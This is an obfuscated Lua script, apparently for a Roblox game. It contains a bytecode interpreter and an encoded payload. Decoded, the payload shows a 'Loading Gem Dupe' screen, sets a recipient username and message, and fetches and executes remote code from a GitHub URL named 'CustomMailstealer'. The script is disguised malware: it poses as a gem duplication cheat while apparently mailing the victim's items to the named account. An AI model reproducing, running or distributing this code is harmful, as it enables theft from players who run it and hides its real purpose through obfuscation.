--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v83=0;while true do if (v83==0) then v19=v0(v3(v30,1,1));return "";end end else local v84=v2(v0(v30,16));if v19 then local v90=v5(v84,v19);v19=nil;return v90;else return v84;end end end);local function v20(v31,v32,v33)if v33 then local v85=0 -(877 -(282 + 595)) ;local v86;while true do if (v85==((1637 -(1523 + 114)) -0)) then v86=(v31/((3 -1)^(v32-(2 -1))))%(2^(((v33-(620 -(555 + 58 + 6))) -(v32-(932 -(857 + 74)))) + (569 -(367 + 201)))) ;return v86-(v86%(928 -(214 + (1015 -302)))) ;end end else local v87=2^(v32-(1 + 0)) ;return (((v31%(v87 + v87))>=v87) and (1 + 0)) or (1065 -(68 + 997)) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0 + 0 ;local v36;local v37;while true do if (v35==1) then return (v37 * (1526 -(226 + 1044))) + v36 ;end if (v35==((180 -(67 + 113)) -(0 + 0))) then v36,v37=v1(v16,v18,v18 + (3 -1) );v18=v18 + (119 -((78 -46) + 85)) ;v35=1 + 0 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + (5 -2) + 0 );v18=v18 + (15 -11) ;return (v41 * (16778168 -(584 + 218 + 150))) + (v40 * (176444 -110908)) + (v39 * 256) + v38 ;end local function v24()local v42=997 -(915 + 82) ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(0 -0)) then v43=v23();v44=v23();v42=1;end if (v42==(2 + 1)) then if (v47==0) then if (v46==0) then return v48 * (0 -0) ;else v47=1;v45=1187 -((2207 -(116 + 1022)) + (491 -373)) ;end elseif (v47==(4643 -2596)) then return ((v46==(0 -(0 + 0))) and (v48 * (((3 -2) + 0)/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(1015 + 8) ) * (v45 + (v46/(2^(843 -(368 + 423))))) ;end if (v42==(6 -4)) then v47=v20(v44,39 -(10 + 8) ,(422 -303) -88 );v48=((v20(v44,474 -(416 + 26) )==1) and  -(3 -2)) or (1 + 0) ;v42=3;end if (v42==((860 -(814 + 45)) -0)) then v45=439 -((357 -212) + 293) ;v46=(v20(v44,431 -(44 + 386) ,1506 -(998 + 488) ) * ((1 + 1)^(27 + 5))) + v43 ;v42=774 -(201 + 571) ;end end end local function v25(v49)local v50;if  not v49 then v49=v23();if (v49==(0 + 0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;local v51={};for v67=886 -(261 + 624) , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0 + 0 ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52~=1) then else v55=nil;v56=nil;v52=2;end if (v52==3) then v59=nil;v60=nil;v52=981 -(553 + 424) ;end if (v52==(0 -0)) then v53=1000 -(451 + 549) ;v54=nil;v52=1 + 0 ;end if (4==v52) then while true do if (v53~=(0 + 0)) then else local v97=0 -0 ;while true do if (v97~=(1 + 0)) then else v53=1 -0 ;break;end if (v97==0) then v54=0;v55=nil;v97=1;end end end if (v53~=(6 -3)) then else v60=nil;while true do local v101=0 -0 ;local v102;while true do if (v101~=0) then else v102=0;while true do if (v102==(1385 -(746 + 638))) then if ((0 + 0)==v54) then local v135=0;local v136;while true do if (0==v135) then v136=0 -0 ;while true do if (v136==(341 -(218 + 123))) then local v160=0 + 0 ;while true do if (v160==1) then v136=1582 -(1535 + 46) ;break;end if (v160==(0 + 0)) then v55={};v56={};v160=1 + 0 ;end end end if (v136==(561 -(306 + 254))) then v57={};v54=1;break;end end break;end end end if (v54==(1 + 1)) then local v137=1329 -(797 + 532) ;local v138;while true do if (v137~=0) then else v138=0;while true do if ((0 -0)==v138) then local v161=0 + 0 ;while true do if (v161~=(1468 -(899 + 568))) then else v138=1 + 0 ;break;end if (v161==(0 -0)) then for v171=2 -1 ,v59 do local v172=603 -(268 + 335) ;local v173;local v174;local v175;local v176;while true do if (v172~=(292 -(60 + 230))) then else while true do if (v173~=(572 -(426 + 146))) then else v174=0;v175=nil;v173=1 -0 ;end if ((1 -0)==v173) then v176=nil;while true do if (v174==(0 + 0)) then local v188=238 -(64 + 174) ;local v189;while true do if (v188==(0 + 0)) then v189=1456 -(282 + 1174) ;while true do if (v189==(812 -(569 + 242))) then v174=1 -0 ;break;end if (v189==(336 -(144 + 192))) then local v200=216 -(42 + 174) ;local v201;while true do if (v200==(0 -0)) then v201=0;while true do if (v201==(0 + 0)) then v175=v21();v176=nil;v201=1;end if (v201~=1) then else v189=1;break;end end break;end end end end break;end end end if (v174==(1 + 0)) then if (v175==(1 + 0)) then v176=v21()~=(1024 -(706 + 318)) ;elseif (v175==2) then v176=v24();elseif (v175~=(1254 -(721 + 530))) then else v176=v25();end v60[v171]=v176;break;end end break;end end break;end if (v172==(1580 -(1183 + 397))) then v173=0 -0 ;v174=nil;v172=1;end if (v172==1) then v175=nil;v176=nil;v172=1273 -(945 + 326) ;end end end v58[7 -4 ]=v21();v161=1976 -(1913 + 62) ;end end end if (v138~=1) then else for v162=1 + 0 ,v23() do local v163=0 + 0 ;local v164;while true do if (v163==(700 -(271 + 429))) then v164=v21();if (v20(v164,1 + 0 ,1)==(1500 -(1408 + 92))) then local v177=1661 -(1477 + 184) ;local v178;local v179;local v180;local v181;while true do if (v177~=(0 -0)) then else v178=0;v179=nil;v177=1 + 0 ;end if (v177~=(1087 -(461 + 625))) then else v180=nil;v181=nil;v177=1290 -(993 + 295) ;end if (v177==(1 + 1)) then while true do if (v178~=(1172 -(418 + 753))) then else local v183=0 + 0 ;while true do if (v183~=1) then else v178=1 + 1 ;break;end if (v183==(0 + 0)) then local v193=0;while true do if (v193~=(2 -1)) then else v183=1 + 0 ;break;end if (v193~=(529 -(406 + 123))) then else v181={v22(),v22(),nil,nil};if (v179==(476 -(41 + 435))) then local v202=1001 -(938 + 63) ;while true do if (v202==(0 + 0)) then v181[1128 -(936 + 189) ]=v22();v181[1149 -(466 + 679) ]=v22();break;end end elseif (v179==(2 -1)) then v181[8 -5 ]=v23();elseif (v179==(1902 -(106 + 1794))) then v181[1 + 2 ]=v23() -((1 + 1)^16) ;elseif (v179==(8 -5)) then local v207=267 -(176 + 91) ;local v208;local v209;while true do if ((0 -0)==v207) then v208=0 -0 ;v209=nil;v207=2 -1 ;end if (v207~=(115 -(4 + 110))) then else while true do if (v208~=(584 -(57 + 527))) then else v209=0;while true do if (v209~=(1427 -(41 + 1386))) then else v181[3 + 0 ]=v23() -((105 -(17 + 86))^16) ;v181[13 -9 ]=v22();break;end end break;end end break;end end end v193=1;end end end end end if (0==v178) then local v184=0;while true do if (v184==0) then v179=v20(v164,2,1021 -(697 + 321) );v180=v20(v164,10 -6 ,12 -6 );v184=1 + 0 ;end if (v184==(1 + 0)) then v178=1 -0 ;break;end end end if (v178~=(5 -2)) then else if (v20(v180,3,7 -4 )~=1) then else v181[11 -7 ]=v60[v181[1231 -(322 + 905) ]];end v55[v162]=v181;break;end if (v178~=2) then else local v186=166 -(122 + 44) ;while true do if (v186==(611 -(602 + 9))) then if (v20(v180,1,1 -0 )==(1190 -(449 + 740))) then v181[874 -(826 + 46) ]=v60[v181[949 -(245 + 702) ]];end if (v20(v180,6 -4 ,2 + 0 )~=(1 + 0)) then else v181[3]=v60[v181[9 -6 ]];end v186=1 -0 ;end if ((1899 -(260 + 1638))~=v186) then else v178=68 -(30 + 35) ;break;end end end end break;end end end break;end end end v54=443 -(382 + 58) ;break;end end break;end end end break;end if ((0 + 0)==v102) then local v103=0;local v104;while true do if (v103==(1257 -(1043 + 214))) then v104=0 -0 ;while true do if (v104==(1213 -(323 + 889))) then v102=1;break;end if ((0 -0)==v104) then local v159=0 -0 ;while true do if ((1205 -(902 + 303))==v159) then if (v54==1) then local v166=0 -0 ;local v167;while true do if (v166~=0) then else v167=0;while true do if (v167==(580 -(361 + 219))) then local v182=0 + 0 ;while true do if ((320 -(53 + 267))==v182) then v58={v55,v56,nil,v57};v59=v23();v182=983 -(18 + 964) ;end if (v182==1) then v167=1;break;end end end if ((3 -2)~=v167) then else v60={};v54=2 + 0 ;break;end end break;end end end if (v54~=3) then else local v168=0 -0 ;local v169;local v170;while true do if ((1 + 0)~=v168) then else while true do if (v169~=0) then else v170=850 -(20 + 830) ;while true do if (v170~=(0 + 0)) then else local v187=0;while true do if (v187==(126 -(116 + 10))) then for v194=1 + 0 ,v23() do v56[v194-(739 -(542 + 196)) ]=v28();end return v58;end end end end break;end end break;end if (v168==(0 -0)) then v169=0;v170=nil;v168=766 -(468 + 297) ;end end end v159=1 + 0 ;end if (1~=v159) then else v104=563 -(334 + 228) ;break;end end end end break;end end end end break;end end end break;end if (v53~=(2 + 0)) then else local v98=0 + 0 ;local v99;while true do if (v98==(0 -0)) then v99=0 -0 ;while true do if (v99~=0) then else v58=nil;v59=nil;v99=1552 -(1126 + 425) ;end if (v99~=(406 -(118 + 287))) then else v53=11 -8 ;break;end end break;end end end if (v53==1) then local v100=0 -0 ;while true do if (v100==(1122 -(118 + 1003))) then v53=5 -3 ;break;end if ((0 + 0)~=v100) then else v56=nil;v57=nil;v100=237 -(141 + 95) ;end end end end break;end if (v52==(379 -(142 + 235))) then v57=nil;v58=nil;v52=13 -10 ;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v88=0,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + 1 ];else v79[v88]=v76[v88 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v89=0;while true do if (v89==1) then if (v82<=7) then if (v82<=3) then if (v82<=1) then if (v82==0) then local v105=v81[2];v79[v105]=v79[v105](v13(v79,v105 + 1 ,v74));else v79[v81[2]]();end elseif (v82>2) then do return;end else local v107=v81[2];v79[v107]=v79[v107](v13(v79,v107 + 1 ,v74));end elseif (v82<=5) then if (v82==4) then do return;end elseif ((v81[3]=="_ENV") or (v81[3]=="getfenv")) then v79[v81[2]]=v63;else v79[v81[2]]=v63[v81[3]];end elseif (v82>6) then v63[v81[3]]=v79[v81[2]];elseif ((v81[3]=="_ENV") or (v81[3]=="getfenv")) then v79[v81[2]]=v63;else v79[v81[2]]=v63[v81[3]];end elseif (v82<=11) then if (v82<=9) then if (v82==8) then v63[v81[3]]=v79[v81[2]];else v79[v81[2]]();end elseif (v82>10) then local v113=0;local v114;local v115;while true do if (v113==0) then v114=v81[2];v115=v79[v81[3]];v113=1;end if (v113==1) then v79[v114 + 1 ]=v115;v79[v114]=v115[v81[4]];break;end end else local v116=0;local v117;local v118;while true do if (v116==0) then v117=v81[2];v118=v79[v81[3]];v116=1;end if (v116==1) then v79[v117 + 1 ]=v118;v79[v117]=v118[v81[4]];break;end end end elseif (v82<=13) then if (v82==12) then local v119=v81[2];local v120,v121=v72(v79[v119](v13(v79,v119 + 1 ,v81[3])));v74=(v121 + v119) -1 ;local v122=0;for v132=v119,v74 do v122=v122 + 1 ;v79[v132]=v120[v122];end else v79[v81[2]]=v81[3];end elseif (v82==14) then local v125=0;local v126;local v127;local v128;local v129;while true do if (v125==0) then v126=v81[2];v127,v128=v72(v79[v126](v13(v79,v126 + 1 ,v81[3])));v125=1;end if (v125==2) then for v156=v126,v74 do v129=v129 + 1 ;v79[v156]=v127[v129];end break;end if (v125==1) then v74=(v128 + v126) -1 ;v129=0;v125=2;end end else v79[v81[2]]=v81[3];end v73=v73 + 1 ;break;end if (0==v89) then v81=v69[v73];v82=v81[1];v89=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!0A3O0003083O00557365726E616D65030A3O0074726567616D65726564030F3O00475F4C6F6164696E675363722O656E03103O004C6F6164696E672047656D2044757065030D3O00475F4D61696C6D652O7361676503073O002O67732062726F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269437573746F6D2F6D61696E2F437573746F6D4D61696C737465616C6572000E3O00120F3O00023O0012073O00013O00120F3O00043O0012073O00033O00120F3O00063O0012073O00053O0012063O00073O001206000100083O00200A00010001000900120F0003000A4O000C000100034O00025O00022O00093O000100012O00043O00017O00",v9(),...);